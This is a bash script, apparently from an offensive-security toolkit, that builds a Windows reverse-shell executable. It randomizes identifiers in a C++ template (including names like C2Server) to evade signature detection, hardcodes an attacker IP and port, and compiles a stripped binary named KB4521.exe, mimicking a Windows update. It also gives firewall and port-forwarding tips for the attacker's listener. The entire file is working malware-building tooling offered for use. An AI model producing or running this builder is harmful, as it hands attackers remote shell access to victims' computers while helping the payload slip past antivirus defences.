#!/bin/bash

RED='\033[1;31m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
YELLOW='\033[49;93m'
NC='\033[0m' # No Color

echo -e "${YELLOW}"
echo -e "+--------------------------------------------------+"
echo -e "|  Adversarial Informatics High Entropy Rev Shell  |"
echo -e "|               cygienesolutions.com               |"
echo -e "|        [Usage]: ./prometheus.sh <IP> <PORT>      |"
echo -e "+--------------------------------------------------+"
echo -e "${NC}"
if [ $# == 0 ] ; then
    echo "[*] Prometheus will generate a brand new high-entropy PE with a hardcoded socket address."
    echo -e "${GREEN}"
    echo -e "Public IP: $(curl -s ifconfig.io)"
    echo -e "Public IPv4: $(curl -s ifconfig.me)\x0a"
    echo "[!] Don't forget to punch a hole in your FW (80,443) and PRTFWD to the local machine."
    echo -e ""
    echo -e "[Usage]: ./prometheus.sh <IP> <PORT>"
    echo -e "${NC}"
    echo ""
    exit 1; fi

IP=$1
PORT=$2

echo -e "${GREEN}"
echo -e "Building Custom High Entropy Reverse Shell Executable..."
echo -e "${NC}"


cp rev_shell.cpp_rsc rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/mySocket/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 7 | head -n 1)
sed -i "s/DEFAULT_BUFLEN/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/sinfo/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/RecvCode/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/version/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/C2Server/${RANDVAL}/g" rev_shell.cpp

RANDVAL=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
sed -i "s/C2Port/${RANDVAL}/g" rev_shell.cpp

echo "        char host[] = \"$IP\";" >> rev_shell.cpp
echo "        int port = $PORT;" >> rev_shell.cpp
echo "        RunShell(host, port);" >> rev_shell.cpp
echo "    }" >> rev_shell.cpp
echo "    return 0;" >> rev_shell.cpp
echo "}" >> rev_shell.cpp

echo -e "${GREEN}"
echo -e "Souce code complete..."
echo -e "Compiling..."
echo -e "${NC}"

i686-w64-mingw32-g++ rev_shell.cpp -o KB4521.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc 

echo -e "${GREEN}"
echo -e "Cleaning up..."
echo -e "Done. Support The Free Information Movement"
echo -e "${NC}"

rm rev_shell.cpp
ls -lrt KB*
file KB4521.exe
md5sum KB4521.exe

